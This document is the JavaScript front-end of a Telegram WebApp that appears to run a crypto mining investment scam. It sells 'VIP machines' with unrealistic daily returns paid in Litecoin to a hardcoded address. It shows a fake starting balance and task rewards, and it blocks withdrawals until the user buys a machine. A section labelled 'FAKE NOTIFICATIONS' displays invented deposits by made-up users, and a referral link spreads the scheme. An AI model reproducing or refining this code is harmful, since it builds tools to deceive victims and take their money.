const tg = window.Telegram.WebApp;
tg.expand();

// CONFIG
const LTC_ADDRESS = "ltc1qv5aape3pah2f954k5jjx9kgnrnkxzytm6f7an8";

// VIP MACHINES DATA
const machines = [
    { id: 1, name: "Node V1", price: 10, daily: 0.50, roi: 20 },
    { id: 2, name: "Node V2", price: 50, daily: 2.80, roi: 18 },
    { id: 3, name: "Node V3", price: 100, daily: 6.00, roi: 16 },
    { id: 4, name: "Cluster V4", price: 250, daily: 16.00, roi: 15 },
    { id: 5, name: "Cluster V5", price: 500, daily: 35.00, roi: 14 },
    { id: 6, name: "Farm V6", price: 800, daily: 60.00, roi: 13 },
    { id: 7, name: "Farm V7", price: 1600, daily: 130.00, roi: 12 },
    { id: 8, name: "Quantum X", price: 2700, daily: 250.00, roi: 11 }
];

// USER STATE
let balance = localStorage.getItem('balance') ? parseFloat(localStorage.getItem('balance')) : 5.00;
let vipLevel = localStorage.getItem('vipLevel') ? parseInt(localStorage.getItem('vipLevel')) : 0;
let username = (tg.initDataUnsafe.user && tg.initDataUnsafe.user.first_name) ? tg.initDataUnsafe.user.first_name : "Investor";
let userId = (tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "88392";

// INIT
document.getElementById('username').innerText = username;
document.getElementById('ref-link').value = `https://t.me/SkyTechBot?start=${userId}`;
updateUI();
renderMachines();

// RENDER MACHINES
function renderMachines() {
    let html = '';
    machines.forEach(m => {
        html += `
        <div class="invest-card">
            <div class="invest-header">
                <span class="plan-name">${m.name}</span>
                <span class="plan-tag">VIP Needed</span>
            </div>
            <div class="invest-stats">
                <div class="stat-item"><span class="stat-val">$${m.price}</span><span class="stat-label">Price</span></div>
                <div class="stat-item"><span class="stat-val">$${m.daily}</span><span class="stat-label">Daily</span></div>
                <div class="stat-item"><span class="stat-val">${m.roi} Days</span><span class="stat-label">Cycle</span></div>
            </div>
            <button class="invest-btn" onclick="openModal('deposit', ${m.price}, '${m.name}')">Invest Now</button>
        </div>`;
    });
    document.getElementById('machine-list').innerHTML = html;
}

// UI LOGIC
function nav(page, el) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.getElementById('page-' + page).classList.add('active');
    el.classList.add('active');
}

function openModal(type, amount = 0, name = '') {
    if(type === 'deposit') {
        if(amount > 0) {
            document.getElementById('dep-amount').innerText = `$${amount}.00`;
            document.getElementById('dep-plan-name').innerText = name;
        } else {
            document.getElementById('dep-amount').innerText = `Select Plan`;
        }
        document.getElementById('modal-deposit').style.display = 'flex';
    } else {
        document.getElementById('with-bal').innerText = balance.toFixed(2);
        document.getElementById('modal-withdraw').style.display = 'flex';
    }
}

function closeModal(type) {
    document.getElementById('modal-' + type).style.display = 'none';
}

function copyAddr() {
    navigator.clipboard.writeText(LTC_ADDRESS);
    tg.showAlert("Address Copied!");
}

function copyRef() {
    navigator.clipboard.writeText(document.getElementById('ref-link').value);
    tg.showAlert("Invite Link Copied!");
}

// PAYMENT VERIFICATION (MOCK)
async function verifyPayment() {
    const txid = document.getElementById('txid').value;
    if(txid.length < 5) return tg.showAlert("Invalid TXID");

    tg.MainButton.text = "Verifying on Blockchain...";
    tg.MainButton.show();

    try {
        const res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ txid: txid, myAddress: LTC_ADDRESS })
        });
        const data = await res.json();
        tg.MainButton.hide();

        if(data.success) {
            let amount = Math.floor(data.amount_huf / 380); // HUF to USD mock
            // Ha túl kicsi a befizetés a teszthez, fixáljuk
            if(amount < 1) amount = 10; 
            
            balance += amount;
            vipLevel = 1; // Upgrade VIP
            localStorage.setItem('vipLevel', vipLevel);
            updateUI();
            closeModal('deposit');
            tg.showAlert(`✅ Success! Payment of $${amount} received. VIP Activated.`);
        } else {
            tg.showAlert("Payment not found yet. Try again in 2 mins.");
        }
    } catch(e) {
        tg.MainButton.hide();
        // Fallback for demo if backend fails
        tg.showAlert("Network Error (Demo Mode)");
    }
}

function requestWithdraw() {
    if(vipLevel === 0) {
        tg.showAlert("⚠️ Withdrawal Failed!\n\nReason: Account not active.\nAction: Purchase any VIP machine to activate withdrawals.");
    } else {
        if(balance < 20) {
             tg.showAlert("Minimum withdrawal is $20.");
        } else {
             tg.showAlert("Withdrawal submitted! Funds will arrive in 24h.");
        }
    }
}

function completeTask(btn) {
    if(!btn.classList.contains('disabled')) {
        btn.innerText = "Checking...";
        setTimeout(() => {
            btn.innerText = "Done";
            btn.classList.add('disabled');
            balance += 0.50;
            updateUI();
            tg.showAlert("Task Completed! +$0.50");
        }, 1500);
    }
}

function updateUI() {
    document.getElementById('main-balance').innerText = balance.toFixed(2);
    document.getElementById('vip-display').innerText = `VIP ${vipLevel}`;
    localStorage.setItem('balance', balance);
}

// FAKE NOTIFICATIONS
const users = ['User9932', 'CryptoMike', 'Anna_K', 'LTC_Whale', 'Investor01'];
const actions = ['deposited $500', 'withdrew $120', 'bought Cluster V4', 'invited 2 friends'];
setInterval(() => {
    const u = users[Math.floor(Math.random() * users.length)];
    const a = actions[Math.floor(Math.random() * actions.length)];
    const toast = document.getElementById('toast');
    document.getElementById('toast-msg').innerText = `${u} ${a}`;
    toast.classList.add('show');
    setTimeout(() => { toast.classList.remove('show'); }, 4000);
}, 8000);